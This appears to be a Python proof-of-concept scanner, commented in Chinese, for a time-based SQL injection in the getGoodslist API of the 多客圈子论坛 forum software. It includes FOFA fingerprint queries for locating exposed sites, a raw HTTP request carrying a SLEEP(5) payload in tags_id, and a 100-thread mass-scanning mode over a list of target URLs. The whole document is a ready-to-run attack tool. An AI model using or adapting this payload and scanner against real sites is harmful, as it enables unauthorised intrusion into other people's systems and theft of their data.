# fofa：body="/static/index/js/jweixin-1.2.0.js"||body="多客官方"||body="多客圈子论坛"
"""poc：GET /api/index/getGoodslist?tags_id=1'%29+AND+%28SELECT+1904+FROM+%28SELECT%28SLEEP%285%29%29%29xCMp%29--+OGeQ HTTP/1.1
        Host: [目标主机]
        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.1739.87 Safari/537.36
        Accept: */*
        Connection: close"""


import sys,argparse
import requests
import json
import urllib3
import warnings
from multiprocessing.dummy import Pool # 多线程的库

# 禁用不安全请求警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def banner():
    test = """
                  __     ________                  .___     .__  .__          __   
    ____   _____/  |_  /  _____/  ____   ____   __| _/_____|  | |__| _______/  |_ 
   / ___\_/ __ \   __\/   \  ___ /  _ \ /  _ \ / __ |/  ___/  | |  |/  ___/\   __\
  / /_/  >  ___/|  |  \    \_\  (  <_> |  <_> ) /_/ |\___ \|  |_|  |\___ \  |  |  
  \___  / \___  >__|   \______  /\____/ \____/\____ /____  >____/__/____  > |__|  
 /_____/      \/              \/                   \/    \/             \/        
"""
    print(test)



def main():
    banner()
    # 先处理命令行输入的内容
    # 初始化
    parse = argparse.ArgumentParser(description="多客圈子论坛系统 getGoodslist 存在SQL注入")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help="Please input your url")
    parse.add_argument('-f','--flie',dest='file',type=str,help="Please input your file")

    # 实例化
    args = parse.parse_args()

    # 对用户输入的参数进行判断 只能是单个的，要不一个url，或一个文件
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程处理
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
    else:
        print(f"Usage python {sys.argv[0]} -h")


def poc(targes):
    link = "/api/index/getGoodslist?tags_id=1'%29+AND+%28SELECT+1904+FROM+%28SELECT%28SLEEP%285%29%29%29xCMp%29--+OGeQ"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.1739.87 Safari/537.36",
        "Accept": "*/*",
        "Connection": "close"
    }
    
    
    try:
        res1 = requests.get(url=targes,headers=headers,timeout=15,verify=False)
        if res1.status_code == 200:
            res2 =requests.get(url=targes+link,headers=headers,timeout=15,verify=False)
            if res2.elapsed.total_seconds() >= 5:
                print(f"[+]该{targes}存在sql注入")
                # with open("result.txt",'a',encoding='utf-8') as f:      # 将结果写入到result.txt文件中
                #     f.write(f"[+]该{targes}存在sql注入"+'\n')
            else:
                print(f"[-]该{targes}不存在sql注入")
    except:
        print(f"该{targes}存在问题，请手工进行测试")


# 函数入口
if __name__ == "__main__":
    main()